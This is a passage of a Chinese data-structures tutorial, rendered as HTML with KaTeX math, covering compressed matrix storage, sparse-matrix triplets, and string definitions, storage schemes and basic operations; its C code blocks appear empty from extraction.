stretchy="false">⌋</mo><mo>=</mo><mn>1</mn><mo separator="true">,</mo><mi>j</mi><mo>=</mo><mn>0</mn><mo>−</mo><mn>2</mn><mi>x</mi><mn>1</mn><mo>+</mo><mn>3</mn><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">i = \lfloor (0 + 1) / 3 + 1 \rfloor = 1, j = 0 - 2 x 1 + 3 = 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">⌊(</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mord">/3</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">⌋</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.854em;vertical-align:-0.1944em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">2</span><span class="mord mathnormal">x</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">3</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>，存放的是 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mrow><mn>1</mn><mo separator="true">,</mo><mn>1</mn></mrow></msub></mrow><annotation encoding="application/x-tex">a_{1,1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7167em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mpunct mtight">,</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span>； 当 <code>k = 2</code> 时 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi><mo>=</mo><mo stretchy="false">⌊</mo><mo stretchy="false">(</mo><mn>2</mn><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mi mathvariant="normal">/</mi><mn>3</mn><mo>+</mo><mn>1</mn><mo stretchy="false">⌋</mo><mo>=</mo><mn>2</mn><mo separator="true">,</mo><mi>j</mi><mo>=</mo><mn>2</mn><mo>−</mo><mn>2</mn><mi>x</mi><mn>2</mn><mo>+</mo><mn>3</mn><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">i = \lfloor (2 + 1) / 3 + 1 \rfloor = 2, j = 2 - 2 x 2 + 3 = 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">⌊(</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mord">/3</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">⌋</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.854em;vertical-align:-0.1944em;"></span><span class="mord">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">2</span><span class="mord mathnormal">x</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">3</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>，存放的是 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mrow><mn>2</mn><mo separator="true">,</mo><mn>1</mn></mrow></msub></mrow><annotation encoding="application/x-tex">a_{2,1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7167em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mpunct mtight">,</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span>；当 <code>k = 4</code> 时 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi><mo>=</mo><mo stretchy="false">⌊</mo><mo stretchy="false">(</mo><mn>4</mn><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mi mathvariant="normal">/</mi><mn>3</mn><mo>+</mo><mn>1</mn><mo stretchy="false">⌋</mo><mo>=</mo><mn>2</mn><mo separator="true">,</mo><mi>j</mi><mo>=</mo><mn>4</mn><mo>−</mo><mn>2</mn><mo>×</mo><mn>2</mn><mo>+</mo><mn>3</mn><mo>=</mo><mn>3</mn></mrow><annotation encoding="application/x-tex">i = \lfloor (4 + 1) / 3 + 1 \rfloor = 2, j = 4 - 2 \times 2 + 3 = 3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">⌊(</span><span class="mord">4</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mord">/3</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">⌋</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.854em;vertical-align:-0.1944em;"></span><span class="mord">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">4</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">3</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">3</span></span></span></span>，存放的是 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mrow><mn>2</mn><mo separator="true">,</mo><mn>3</mn></mrow></msub></mrow><annotation encoding="application/x-tex">a_{2,3}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7167em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mpunct mtight">,</span><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span>。</p>
</li>
</ol>
<h4> 稀疏矩阵</h4>
<p>矩阵中非零元素的个数 <code>t</code>，相对矩阵元素的个数 <code>s</code> 来说非常少，即 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mo>≫</mo><mi>t</mi></mrow><annotation encoding="application/x-tex">s \gg t</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathnormal">s</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≫</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6151em;"></span><span class="mord mathnormal">t</span></span></span></span> 的矩阵称为 <strong>稀疏矩阵</strong>。例如，一个矩阵的阶为 <code>100x100</code>，该矩阵中只有少于 <code>100</code> 个非零元素。</p>
<p>若采用常规的方法存储稀疏矩阵，则相当浪费存储空间，因此仅存储非零元素。但通常非零元素的分布没有规律，所以仅存储非零元素的值是不够的，还要存储它所在的行和列。因此，将非零元素及其相应的行和列构成一个三元组（行标，列标，值），如下所示。然后按照某种规律存储这些三元组。稀疏矩阵压缩存储后便失去了随机存取特性。</p>
<p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>M</mi><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.16em" columnalign="center center center center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>4</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>6</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>9</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>23</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow><mspace linebreak="newline"></mspace></mrow><annotation encoding="application/x-tex">
M = \begin{bmatrix}
   4 &amp; 0 &amp; 0 &amp; 0 \\
   0 &amp; 0 &amp; 6 &amp; 0 \\
   0 &amp; 9 &amp; 0 &amp; 0 \\
   0 &amp; 23 &amp; 0 &amp; 0 \\
\end{bmatrix} \\
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:4.8em;vertical-align:-2.15em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.65em;"><span style="top:-4.65em;"><span class="pstrut" style="height:6.8em;"></span><span style="width:0.667em;height:4.800em;"><svg xmlns="http://www.w3.org/2000/svg" width="0.667em" height="4.800em" viewBox="0 0 667 4800"><path d="M403 1759 V84 H666 V0 H319 V1759 v1200 v1759 h347 v-84
H403z M403 1759 V0 H319 V1759 v1200 v1759 h84z"></path></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.65em;"><span style="top:-4.81em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">4</span></span></span><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-1.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.15em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.65em;"><span style="top:-4.81em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">9</span></span></span><span style="top:-1.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">23</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.15em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.65em;"><span style="top:-4.81em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">6</span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-1.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.15em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.65em;"><span style="top:-4.81em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-1.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.15em;"><span></span></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.65em;"><span style="top:-4.65em;"><span class="pstrut" style="height:6.8em;"></span><span style="width:0.667em;height:4.800em;"><svg xmlns="http://www.w3.org/2000/svg" width="0.667em" height="4.800em" viewBox="0 0 667 4800"><path d="M347 1759 V0 H0 V84 H263 V1759 v1200 v1759 H0 v84 H347z
M347 1759 V0 H263 V1759 v1200 v1759 h84z"></path></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.15em;"><span></span></span></span></span></span></span></span></span><span class="mspace newline"></span></span></span></span></p>
<p>对应的三元组：</p>
<table>
<thead>
<tr>
<th style="text-align:center">i</th>
<th style="text-align:center">j</th>
<th style="text-align:center">v</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">0</td>
<td style="text-align:center">0</td>
<td style="text-align:center">4</td>
</tr>
<tr>
<td style="text-align:center">1</td>
<td style="text-align:center">2</td>
<td style="text-align:center">6</td>
</tr>
<tr>
<td style="text-align:center">2</td>
<td style="text-align:center">1</td>
<td style="text-align:center">9</td>
</tr>
<tr>
<td style="text-align:center">3</td>
<td style="text-align:center">1</td>
<td style="text-align:center">23</td>
</tr>
</tbody>
</table>
<p>稀疏矩阵的三元组既可以采用数组存储，也可以采用十字链表法存储。</p>
<h2> 串</h2>
<h3> 串的定义和实现</h3>
<p>字符串简称串，计算机上非数值处理的对象基本都是字符串数据。常见的信息检索系统（如：搜索引擎）、文本编辑程序（如：Word）、问答系统、自然语言翻译系统等，都是以字符串数据作为处理对象的。</p>
<h4> 串的定义</h4>
<p><strong>串（string）是由零个或多个字符组成的有限序列</strong>。一般记为：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi><msup><mo>=</mo><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><msub><mi>a</mi><mn>1</mn></msub><msub><mi>a</mi><mn>2</mn></msub><mo>…</mo><msubsup><mi>a</mi><mi>n</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msubsup><mo stretchy="false">(</mo><mi>n</mi><mo>⩾</mo><mn>0</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">S = 'a_{1}a_{2} \dotsc a_{n}' (n \geqslant 0)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7519em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel"><span class="mrel">=</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0019em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-2.453em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel amsrm">⩾</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">0</span><span class="mclose">)</span></span></span></span></p>
<p>其中，<code>S</code> 是串名，单引号括起来的字符序列是串的值；<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">a_{1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 可以是字母、数字或其他字符；串中字符的个数 <code>n</code> 称为串的长度。<code>n = 0</code> 时的串称为空串（用 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">∅</mi></mrow><annotation encoding="application/x-tex">\varnothing</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6633em;vertical-align:-0.0817em;"></span><span class="mord amsrm">∅</span></span></span></span> 表示）。</p>
<p><strong>串中任意多个连续的字符组成的子序列称为该串的子串，包含子串的串称为主串</strong>。某个字符在串中的序号称为该字符在串中的 <strong>位置</strong>。子串在主串中的位置以子串的第一个字符在主串中的位置来表示。当两个串的长度相等且每个对应位置的字符都相等时，称这两个串是相等的。</p>
<p>例如，有串 <code>A = 'China Beijing', B = 'Beijing', C = 'China'</code>，则它们的长度分别为 <code>13</code>、<code>7</code> 和 <code>5</code>。<code>B</code> 和 <code>C</code> 是 <code>A</code> 的子串，<code>B</code> 在 <code>A</code> 中的位置是 <code>7</code>，<code>C</code> 在 <code>A</code> 中的位置是 <code>1</code>。</p>
<p>需要注意的是，由一个或多个空格（空格是特殊字符）组成的串称为 <strong>空格串</strong>（注意，空格串不是空串），其长度为串中空格字符的个数。</p>
<p>串的逻辑结构和线性表极为相似，区别仅在于串的数据对象限定为字符集。在基本操作上，串和线性表有很大差别。线性表的基本操作主要以单个元素作为操作对象，如：查找、插入或删除某个元素等；而串的基本操作通常以子串作为操作对象，如：查找、插入或删除一个子串等。</p>
<h4> 串的存储结构</h4>
<ol>
<li>
<p><strong>定长顺序存储表示</strong></p>
<p>类似于线性表的顺序存储结构，用一组地址连续的存储单元存储串值的字符序列。在串的定长顺序存储结构中，为每个串变量分配一个固定长度的存储区，即定长数组。</p>
<div class="language-c line-numbers-mode" data-ext="c"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>串的实际长度只能小于或等于 <code>MAXLEN</code>，超过预定义长度的串值会被舍去，称为 <strong>截断</strong>。<strong>串长有两种表示方法</strong>：一是如上述定义描述的那样，用一个额外的变量 <code>length</code> 来存放串的长度；二是在串值后面加一个不计入串长的结束标记字符 “<code>\0</code>”，此时的串长为隐含值。</p>
<p>在一些串的操作（如：插入、联接等）中，若串值序列的长度超过上界 <code>MAXLEN</code>，约定用 “截断” 法处理，要克服这种弊端，只能不限定串长的最大长度，即采用动态分配的方式。</p>
</li>
<li>
<p><strong>堆分配存储表示</strong></p>
<p>堆分配存储表示仍然以一组地址连续的存储单元存放串值的字符序列，但它们的存储空间是在程序执行过程中动态分配得到的。</p>
<div class="language-c line-numbers-mode" data-ext="c"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>在 C 语言中，存在一个称之为 “堆” 的自由存储区，并用 <code>malloc()</code> 和 <code>free()</code> 函数来完成动态存储管理。利用 <code>malloc()</code>^ 每个新产生的串分配一块实际串长所需的存储空间，若分配成功，则返回一个指向起始地址的指针，作为串的基地址，这个串由 <code>ch</code> 指针来指示；若分配失败，则返回 <code>NULL</code>。己分配的空间可用 <code>free()</code> 释放掉。</p>
<p>上述两种存储表示通常为高级程序设计语言所采用。</p>
</li>
<li>
<p><strong>块链存储表示</strong></p>
<p>类似于线性表的链式存储结构，也可采用链表方式存储串值。由于串的特殊性（每个元素只有一个字符），在具体实现时，每个结点既可以存放一个字符，也可以存放多个字符。每个结点称为 <strong>块</strong>，整个链表称为 <strong>块链结构</strong>。</p>
</li>
</ol>
<h4> 串的基本操作</h4>
<ul>
<li><strong>StrAssign(&amp;T, chars)</strong>：赋值操作。把串 <code>T</code> 赋值为 <code>chars</code></li>
<li><strong>StrCopy(&amp;T, S)</strong>：复制操作。由串 <code>S</code> 复制得到串 <code>T</code></li>
<li><strong>StrEmpty(S)</strong>：判空操作。若 <code>S</code> 为空串，则返回 <code>TRUE</code>，否则返回 <code>FALSE</code></li>
<li><strong>StrCompare(S, T)</strong>：比较操作。若 <code>S &gt; T</code>，则 <code>返回值 &gt; 0</code>；若 <code>S = T</code>，则 <code>返回值 = 0</code>；若 <code>S &lt; T</code>，则 <code>返回值 &lt; 0</code></li>
<li><strong>StrLength(S)</strong>：求串长。返回串 <code>S</code> 的元素个数</li>
<li><strong>SubString(&amp;Sub, S,pos, len)</strong>：求子串。用 <code>Sub</code> 返回串 <code>S</code> 的第 <code>pos</code> 个字符起长度为 <code>len</code> 的子串</li>
<li><strong>Concat(&amp;T, Sl, S2)</strong>：串联接。用 <code>T</code> 返回由 <code>S1</code> 和 <code>S2</code> 联接而成的新串</li>
<li><strong>Index(S, T)</strong>：定位操作。若主串 <code>S</code> 中存在与串 <code>T</code> 值相同的子串，则返回它在主串 <code>S</code> 中第一次出现的位置；否则函数值为 <code>0</code></li>
<li><strong>ClearString(&amp;S)</strong>：清空操作。将 <code>S</code> 清为空串</li>
<li><strong>DestroyString(&amp;S)</strong>：销毁串。将串 <code>S</code> 销毁</li>
</ul>
